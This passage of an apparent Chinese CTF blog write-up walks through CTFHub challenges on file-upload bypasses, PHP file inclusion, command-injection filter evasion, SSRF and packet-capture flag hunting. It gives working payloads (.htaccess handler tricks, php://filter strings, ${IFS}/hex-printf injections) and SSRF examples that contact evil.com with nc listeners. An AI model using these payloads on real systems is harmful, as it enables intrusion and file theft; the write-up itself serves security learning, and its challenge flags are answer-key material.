src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126100630016.png" alt></p><h3 id="前端验证">前端验证</h3><p>提示有js前端验证，先F12来看看代码：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126100821814.png" alt></p><p>只允许png/jpg/gif格式上传，可以先把一句话木马用图片格式命名，再burpsuite截断改后缀绕过：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126100950292.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126101147491.png" alt></p><h3 id="htaccess">.htaccess</h3><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>也就是说，如果我们上传了一个htaccess配置，服务器就会运行该配置，从而使原有的限制失效。</p><p>这样的代码就是将png类型的文件解析成php：</p><p><code>AddType  application/x-httpd-php    .png</code></p><p>这种可以将文件名含有key的解析成php：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;key&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><p>写好后上传即可绕过：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126102537087.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126102550417.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126102603611.png" alt></p><h3 id="MIME绕过">MIME绕过</h3><p>只要发送的数据包content-type不是php格式，把后缀名更改就可以：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126103014919.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126102831583.png" alt></p><p>蚁剑连接拿到FLAG：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210126103049922.png" alt></p><h4 id="00截断">00截断</h4><h5 id="00截断的原理">00截断的原理</h5><p>00截断是操作系统层的漏洞，由于操作系统是C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。00截断通常用来绕过web软waf的<strong>白名单</strong>限制。</p><h5 id="php环境00截断的条件">php环境00截断的条件</h5><ul><li>php版本小于5.3.29</li><li>magic_quotes_gpc = Off</li></ul><p>一开始直接在php后加%00截断，发现上传成功后怎么也找不到文件。之后才发现road参数应该具体到文件才对……</p><p>于是构造如下的数据包提交，提示上传成功：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128090404135.png" alt></p><p>蚁剑连接成功，发现了之前上传失败的几个文件，被随机命名成图片了：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128090527806.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128090546386.png" alt></p><h4 id="双写后缀">双写后缀</h4><p>先传个php文件，发现php给过滤掉了：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128091534759.png" alt></p><p>改成两个php，还会过滤掉：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128091644934.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128091701664.png" alt></p><p>怀疑是从左到右过滤的，于是从中间加了php，成功绕过：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128091740491.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128091822356.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128091909319.png" alt></p><h3 id="文件头检查">文件头检查</h3><p>先查查一些常用的文件头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java">JPEG (jpg)，文件头：FFD8FF <br><span class="hljs-title function_">PNG</span> <span class="hljs-params">(png)</span>，文件头：<span class="hljs-number">89504E47</span> <br>GIF (gif)，文件头：<span class="hljs-number">47494638</span> <br>TIFF (tif)，文件头：49492A00 <br>Windows <span class="hljs-title function_">Bitmap</span> <span class="hljs-params">(bmp)</span>，文件头：<span class="hljs-number">424D</span> <br>CAD (dwg)，文件头：<span class="hljs-number">41433130</span> <br>Adobe <span class="hljs-title function_">Photoshop</span> <span class="hljs-params">(psd)</span>，文件头：<span class="hljs-number">38425053</span> <br>Rich Text <span class="hljs-title function_">Format</span> <span class="hljs-params">(rtf)</span>，文件头：7B5C727466 <br><span class="hljs-title function_">XML</span> <span class="hljs-params">(xml)</span>，文件头：3C3F786D6C <br><span class="hljs-title function_">HTML</span> <span class="hljs-params">(html)</span>，文件头：68746D6C3E <br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A <br>Outlook <span class="hljs-title function_">Express</span> <span class="hljs-params">(dbx)</span>，文件头：CFAD12FEC5FD746F <br><span class="hljs-title function_">Outlook</span> <span class="hljs-params">(pst)</span>，文件头：2142444E <br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0 <br>MS <span class="hljs-title function_">Access</span> <span class="hljs-params">(mdb)</span>，文件头：5374616E64617264204A <br><span class="hljs-title function_">WordPerfect</span> <span class="hljs-params">(wpd)</span>，文件头：FF575043 <br><span class="hljs-title function_">Postscript</span> <span class="hljs-params">(eps.or.ps)</span>，文件头：252150532D41646F6265 <br>Adobe <span class="hljs-title function_">Acrobat</span> <span class="hljs-params">(pdf)</span>，文件头：255044462D312E <br><span class="hljs-title function_">Quicken</span> <span class="hljs-params">(qdf)</span>，文件头：AC9EBD8F <br>Windows <span class="hljs-title function_">Password</span> <span class="hljs-params">(pwl)</span>，文件头：E3828596 <br>ZIP <span class="hljs-title function_">Archive</span> <span class="hljs-params">(zip)</span>，文件头：504B0304 <br>RAR <span class="hljs-title function_">Archive</span> <span class="hljs-params">(rar)</span>，文件头：<span class="hljs-number">52617221</span> <br>Wave (wav)，文件头：<span class="hljs-number">57415645</span> <br>AVI (avi)，文件头：<span class="hljs-number">41564920</span> <br>Real <span class="hljs-title function_">Audio</span> <span class="hljs-params">(ram)</span>，文件头：2E7261FD <br>Real <span class="hljs-title function_">Media</span> <span class="hljs-params">(rm)</span>，文件头：2E524D46 <br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>，文件头：000001BA <br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>，文件头：000001B3 <br><span class="hljs-title function_">Quicktime</span> <span class="hljs-params">(mov)</span>，文件头：6D6F6F76 <br>Windows <span class="hljs-title function_">Media</span> <span class="hljs-params">(asf)</span>，文件头：3026B2758E66CF11 <br><span class="hljs-title function_">MIDI</span> <span class="hljs-params">(mid)</span>，文件头：4D546864 <br></code></pre></td></tr></table></figure><p>有了文件头就好办了，直接把改后缀的马放到winhex里编辑即可，我这里选择的是png的文件头，直接在文件最前面插入相应的文件头：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128093146465.png" alt></p><p>之后再改后缀绕过就可以上传成功了：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128093021928.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128093312821.png" alt></p><h2 id="RCE">RCE</h2><h3 id="eval">eval</h3><p>看了看代码，这就是个马……把地址复制到蚁剑连接就行了：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128094411711.png" alt></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128094404358.png" alt></p><p>在根目录发现FLAG：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128094704723.png" alt></p><h3 id="文件包含">文件包含</h3><p>这个题首先接收到一个file参数，之后再对file参数的值进行判断，如果含有包含的文件不含有flag字符串的话，就包含出来，否则提示信息。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128095423467.png" alt></p><p>用<code>/etc/passwd</code>为值测试了一下确定是文件包含：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128095744635.png" alt></p><p>下面shell超链接打开后是一个密码为ctfhub的php一句话文本：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128095607353.png" alt></p><p>用文件包含把shell.txt文档的php代码包含出来，然后用post方法提交ctfhub参数，ctfhub参数对应的值就是执行的命令：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128100622010.png" alt></p><p>之后用蚁剑连接，用<code>find / -name flag</code>找到FLAG文件：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210128100904852.png" alt></p><h4 id="php-input">php://input</h4><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731093540164.png" alt></p><p>这段PHP代码的含义就是获取file参数值，并截取前7位看是不是<code>php://</code>，如果是则包含file参数。</p><p>看题目是让我们使用<code>php://input</code>协议拿到flag，只需要让<code>?file=php://input</code>，POST一个php语句进去即可。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731093725008.png" alt></p><h4 id="读取源代码">读取源代码</h4><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731093800531.png" alt></p><p>这道题直接给出了flag所在目录，看代码也是要用php协议，经过测试发现，又屏蔽了<code>php://input</code>。</p><p>所以可以考虑用过滤器<strong>filter</strong>：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731093952753.png" alt></p><p>使用以下payload都能拿到flag：</p><p><code>?file=php://filter/resource=/flag</code>，<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code></p><h3 id="综合过滤练习">综合过滤练习</h3><p>RCE命令注入的前几个题都挺简单的，这次直接来看最后一个。之前已经做过了，不太想开新环境，直接借用了别人WP里的图。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731084255825.png" alt></p><p>从PHP代码里可以看出过滤了**|，\，&amp;，/，;，cat，flag，ctfhub**还有空格。</p><div class="note note-info">            <p>url编码中，%0a是换行符，%0d是回车符，可以用这两个进行命令拼接。</p>          </div><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731084802789.png" alt></p><p>拼接<code>127.0.0.1%0als</code>即可显示当前目录存在文件，发现有个<code>flag_is_here</code>的文件夹，之后需要进入到该文件夹寻找flag。</p><p>但是分号和连接符都屏蔽了，这时候需要通过十六进制与字符串的转换来运行命令。</p><div class="note note-info">            <p>在shell里，IFS是全局变量内部字段分隔符，等同与space，${IFS}即为空格。</p><p>之后就可以利用**$(printf “十六进制字符串”)**来执行命令了。</p>          </div><p>先进入目录，然后查看目录里有那些文件，也就是：</p><p><code>cd flag_is_here;ls</code></p><p>使用（<a href="https://coding.tools/cn/ascii-to-hex%EF%BC%89%E8%BD%AC%E6%8D%A2%EF%BC%8C%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%90%8E%E6%98%AF%EF%BC%9A">https://coding.tools/cn/ascii-to-hex）转换，绕过过滤后是：</a></p><p><code>127.0.0.1%0acd$&#123;IFS&#125;$(printf$&#123;IFS&#125;&quot;\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65&quot;)</code></p><p>如果过滤了括号、关键字，可以将文件名拆开：</p><p><code>a=f;b=g;c=l;d=a;cat$IFS$1f$a$c$d$b.php</code></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731091556588.png" alt></p><p>可以看到文件了。故技重施，直接cat一下这个目录里的php文件：</p><p><code>cat flag_is_here/flag_21788311688601.php</code></p><p>加密后即</p><p><code>127.0.0.1%0a$(printf$&#123;IFS&#125;&quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x5f\x69\x73\x5f\x68\x65\x72\x65\x2f\x66\x6c\x61\x67\x5f\x32\x31\x37\x38\x38\x33\x31\x31\x36\x38\x38\x36\x30\x31\x2e\x70\x68\x70&quot;)</code></p><p>之后在F12查看源码，就能看到FLAG了。</p><p>除此之外还需要说明的一下，*<em><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∗</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">*,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord">∗</span><span class="mpunct">,</span></span></span></span>n(n是大于0的数字),<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">@</mi><mo>∗</mo><mo>∗</mo><mtext>都可以绕过过滤，</mtext><mo>∗</mo><mo>∗</mo><mi>c</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">@**都可以绕过过滤，**ca</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">@</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">都可以绕过过滤，</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord">∗</span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span></span></span></span><em>t即为cat</em></em>。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210731092333270.png" alt></p><h2 id="SSRF">SSRF</h2><p>服务端请求伪造（Server-Side Request Forgery）是攻击者构造由服务器端发起请求的一个漏洞，通常情况下可以实现：</p><ul><li>可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。</li><li>攻击运行在内网或者本地的应用程序。</li><li>对内网web应用进行指纹识别，通过访问默认文件实现 。</li><li>攻击内外网的web应用。sql注入、struct2、redis等。</li><li>利用file协议读取本地文件等。</li></ul><h3 id="伪协议读取文件">伪协议读取文件</h3><p>内网访问这题比较简单，直接来看伪协议。打开环境一片空白，观察url发现有个url参数，构造file协议访问www目录下的flag文件。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801172230966.png" alt></p><p>这里再补充一下其他的协议，参考（<a href="https://www.cnblogs.com/-mo-/p/11673190.html%EF%BC%89%EF%BC%9A">https://www.cnblogs.com/-mo-/p/11673190.html）：</a></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">file:</span><span class="hljs-comment">///</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//</span><br><span class="hljs-symbol">sftp:</span><span class="hljs-comment">//</span><br><span class="hljs-symbol">ldap:</span><span class="hljs-comment">//</span><br><span class="hljs-symbol">tftp:</span><span class="hljs-comment">//</span><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><h4 id="file">file://</h4><p>这种URL Schema可以尝试从文件系统中获取文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=file:/</span><span class="hljs-regexp">//</span>etc<span class="hljs-regexp">/passwdhttp:/</span><span class="hljs-regexp">/example.com/</span>ssrf.php?url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/C:/</span>Windows/win.ini<br></code></pre></td></tr></table></figure><p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p><h4 id="dict">dict://</h4><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?dict:/</span><span class="hljs-regexp">/evil.com:1337/</span> <br>evil.com:$ nc -lvp <span class="hljs-number">1337</span><br>Connection from [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.12</span>] port <span class="hljs-number">1337</span>[tcp/*] <br>accepted (family <span class="hljs-number">2</span>, sport <span class="hljs-number">31126</span>)CLIENT libcurl <span class="hljs-number">7.40</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="sftp">sftp://</h4><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=sftp:/</span><span class="hljs-regexp">/evil.com:1337/</span> <br>evil.com:$ nc -lvp <span class="hljs-number">1337</span><br>Connection from [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.12</span>] port <span class="hljs-number">1337</span>[tcp/*] <br>accepted (family <span class="hljs-number">2</span>, sport <span class="hljs-number">37146</span>)SSH-<span class="hljs-number">2.0</span>-libssh2_1.<span class="hljs-number">4.2</span><br></code></pre></td></tr></table></figure><h4 id="ldap-或ldaps-或ldapi">ldap://或ldaps:// 或ldapi://</h4><p>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=ldap:/</span><span class="hljs-regexp">/localhost:1337/</span>%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquithttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=ldaps:/</span><span class="hljs-regexp">/localhost:1337/</span>%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquithttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=ldapi:/</span><span class="hljs-regexp">/localhost:1337/</span>%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquit<br></code></pre></td></tr></table></figure><h4 id="tftp">tftp://</h4><p>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">Copyhttp:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/ssrf.php?url=tftp:/</span><span class="hljs-regexp">/evil.com:1337/</span>TESTUDPPACKET <br>evil.com:<span class="hljs-comment"># nc -lvup 1337</span><br>Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port1337)TESTUDPPACKEToctettsize0blksize512timeout3<br></code></pre></td></tr></table></figure><h4 id="gopher">gopher://</h4><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//example.com/ssrf.php?url=http://attacker.com/gopher.php</span><br><br><span class="hljs-meta">&lt;?php</span>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);<span class="hljs-meta">?&gt;</span><br>Copyevil.com:<span class="hljs-comment"># nc -lvp 1337</span><br>Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port1337)Connection <span class="hljs-keyword">from</span> [<span class="hljs-number">192.168</span>.<span class="hljs-number">0.12</span>] port <span class="hljs-number">1337</span>[tcp<span class="hljs-comment">/*] accepted (family 2, sport 49398)Hissrftest</span><br></code></pre></td></tr></table></figure><h3 id="端口扫描">端口扫描</h3><blockquote><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</p></blockquote><p>把环境url放入intruder里，url参数后接<code>127.0.0.1:8000</code>，只对端口号进行爆破。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801173155887.png" alt></p><h3 id="POST跳转">POST跳转</h3><blockquote><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p></blockquote><p>故技重施，先读一下flag.php文件，结果还真有，读下代码。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801173556896.png" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>error_reporting(0);<br><br>if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;<br>    echo &quot;Just View From 127.0.0.1&quot;;<br>    return;<br>&#125;<br><br>$flag=getenv(&quot;CTFHUB&quot;); <br>$key = md5($flag);<br><br>if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;<br>    echo $flag;<br>    exit;<br>&#125;<br>?&gt;<br><br>&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;<br>&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;<br>&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;<br>&lt;/form&gt;<br></code></pre></td></tr></table></figure><p>首先判断来源地址是否是本地地址，如果不是本地地址，则返回信息后return结束。之后声明了一个变量flag，其值是环境变量CTFHUB的值；又声明了个key变量，它的值是对flag变量值进行了md5加密后的结果。下面的流程是，如果post提交下key参数存在，并且提交的key值与key值本身相同，则会返回flag。</p><p>弄清楚了逻辑，先从本地地址访问下flag.php：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801175353327.png" alt></p><p>可以看到注释里的key参数，这时候改POST方法提交发现响应包没有返回flag，这是因为我们前端虽然是POST方法，但是服务器执行的却不是，你前端的参数不能提交上去。由题目可知，环境采用了curl函数，我们也可以通过file协议看到：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20210801175535089.png" alt></p><h2 id="MISC">MISC</h2><h3 id="流量分析">流量分析</h3><h4 id="数据库类流量">数据库类流量</h4><h5 id="Mysql流量">Mysql流量</h5><p>本题目直接追踪Mysql的TCP数据流就能够找到flag：<code>ctfhub&#123;mysql_is_S0_E4sy&#125;</code></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20220911201009427.png" alt></p><h5 id="Redis流量">Redis流量</h5><p>比上个Mysql稍微难点，也是直接追踪TCP数据流，查找关键字flag，然后拼接一下就ok了：<code>ctfhub&#123;6051d6123de43dfad7609804925c0121&#125;</code></p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20220911201323923.png" alt></p><h5 id="MongoDB流量">MongoDB流量</h5><p>这道题不用wireshark分析甚至更快，直接notepad++打开搜索<code>ctfhub&#123;</code>完事：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20220911201546100.png" alt></p><h4 id="协议流量分析">协议流量分析</h4><h5 id="ICMP">ICMP</h5><h6 id="Data">Data</h6><p>打开数据包发现，ICMP协议的数据包分为请求的数据包和接收的数据包，从图里ICMP数据包可以发现，Type类型为8的都为请求数据包，且数据段前8个二进制位为计数位，图里为第五个请求数据包（因为从零开始计数）。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20220911192015903.png" alt></p><p>使用wireshark语法<code>ip.src==30.0.250.11 &amp;&amp; icmp</code>可以过滤出请求的数据包：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20220911192532081.png" alt></p><p>依次读上图所指示的位置发现ctfhub字样，逐个记录即是flag：<code>ctfhub&#123;c87eb99796406ac0b&#125;</code></p><h6 id="Length">Length</h6><p>首先输入语法<code>ip.src==30.0.250.11 &amp;&amp; icmp</code>过滤出发送的ICMP包，根据题目注意数据长度位：</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20220911193135532.png" alt></p><p>不难发现每个数据包的长度分别是：<code>99,116,102,104,117,98,123,97,99,98,54,53,57,102,48,50,51,125</code></p><p>直接<code>alt+数字</code>，即可手动输出flag：<code>ctfhub&#123;acb659f023&#125;</code></p><h6 id="LengthBinary">LengthBinary</h6><p>根据提示可以了解到解题思路，关键是数据包长度。先按语法<code>ip.src==30.0.30.10</code>过滤出发送的ICMP数据包，通过观察数据包可以发现，ICMP数据包长度不是32就是64。</p><p><img src="/2021/01/21/CTFHUB-WEB%E5%88%B7%E9%A2%98/image-20220911200120521.png" alt></p><p>依次序查看，遇到一个32位数据包就记录一个0，64位数据包则记录1。这里就不能一个个查了，实在太多了……使用python脚本帮我们记录下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br>pcap = pyshark.FileCapture(<span class="hljs-string">&quot;icmp_len_binary.pcap&quot;</span>, display_filter=<span class="hljs-string">&quot;ip.src==30.0.30.10&quot;</span>)<br>pcap.load_packets()<br>flag_str = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pcap)):<br>    <span class="hljs-keyword">if</span> pcap[i].icmp.data_len == <span class="hljs-string">&#x27;32&#x27;</span>:<br>        flag_str = flag_str+<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">elif</span> pcap[i].icmp.data_len == <span class="hljs-string">&#x27;64&#x27;</span>:<br>        flag_str = flag_str+<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(flag_str)<br></code></pre></td></tr></table></figure><p>最后flag_str的值为<code>011000110111010001100110011010000111010101100010011110110011000000110100011001010110011001100101011001000011000101100101001100000011010101111101</code>,通过二进制转ascii码可得到最后的flag：<code>ctfhub&#123;04efed1e05&#125;</code></p><div class="note note-info">            <p>这里本地调试的过程中遇到了<code>TShark not found. Try adding its location to the configuration file. </code>这个错误。可以在pyshark本地库的配置文件<code>config.ini</code>找到<code>tshark_path</code>参数，将参数值更改为正确的路径。</p>          </div>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>学习</tag>
      
      <tag>CTF</tag>
